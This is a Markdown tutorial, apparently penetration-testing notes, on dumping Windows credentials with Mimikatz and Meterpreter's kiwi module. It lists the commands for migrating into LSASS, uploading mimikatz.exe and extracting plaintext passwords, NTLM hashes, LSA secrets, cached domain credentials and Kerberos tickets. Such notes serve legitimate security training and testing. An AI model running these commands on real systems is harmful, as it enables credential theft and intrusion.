# Dumping Hashes with Mimikatz

Mimikatz is a post-exploitation tool used to extract plaintext credentials, hashes, PINs, and Kerberos tickets from memory.  
It is extremely powerful for **credential dumping** and **privilege escalation**.  

---

## Step 1: Reconnaissance & Migration
```bash
> getuid              # Check current user context
> pgrep lsass         # Find PID of LSASS (Local Security Authority Subsystem Service)
> migrate <pid>       # Migrate into LSASS to gain access to authentication material
> sysinfo             # Confirm system information
```
### Why LSASS?
+ LSASS stores credentials in memory (NTLM hashes, Kerberos tickets, etc.).
+ By migrating into LSASS, we can interact with sensitive processes securely.

### Use Built-in Meterpreter Modules
```bash
> load kiwi
> creds_all           # Dump all available credentials
> wdigest             # Dumps plaintext passwords (if WDigest enabled)
> lsa_dump_sam        # Extracts NTLM password hashes
> lsa_dump_secrets    # Extracts LSA secrets, including SYSKEY
```
+ SYSKEY → Encryption key used to protect the SAM database. It’s essential for boot security, but once extracted, can help attackers decrypt SAM data offline.

## Upload & Run Mimikatz Binary

> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
> shell
>> .\mimikatz.exe



## Core Mimikatz Commands

### 1. `privilege::debug`

* **What it does**: Grants the current process the `SeDebugPrivilege` which allows it to debug and manipulate other processes (like LSASS).
* **Syntax**:

  ```mimikatz
  privilege::debug
  ```
* **Alternatives**:

  * Run Mimikatz as Administrator (privileges are already elevated).
  * Use `!+` in Mimikatz to enable all privileges.

---

### 2. `sekurlsa::logonpasswords`

* **What it does**: Dumps login sessions from memory, showing usernames, domains, NTLM hashes, and sometimes plaintext passwords.
* **Syntax**:

  ```mimikatz
  sekurlsa::logonpasswords
  ```
* **Alternatives**:

  * `sekurlsa::wdigest` → Dumps WDigest credentials.
  * `sekurlsa::kerberos` → Extract Kerberos tickets.
  * `sekurlsa::msv` → Dumps NTLM credentials specifically.

---

### 3. `lsadump::sam`

* **What it does**: Dumps password hashes from the **SAM (Security Accounts Manager) database**.
* **Syntax**:

  ```mimikatz
  lsadump::sam
  ```
* **Alternatives**:

  * `lsadump::secrets` → Dumps stored LSA secrets.
  * `lsadump::cache` → Extract cached domain credentials.

---

## Creative Context

Think of LSASS as the **vault of secrets** in Windows. Migrating into LSASS is like sneaking into the control room.
Mimikatz gives you the master keys:

* `privilege::debug` → Break into the control room.
* `sekurlsa::logonpasswords` → Peek at everyone’s login cards.
* `lsadump::sam` → Duplicate the master keychain of the system.

---


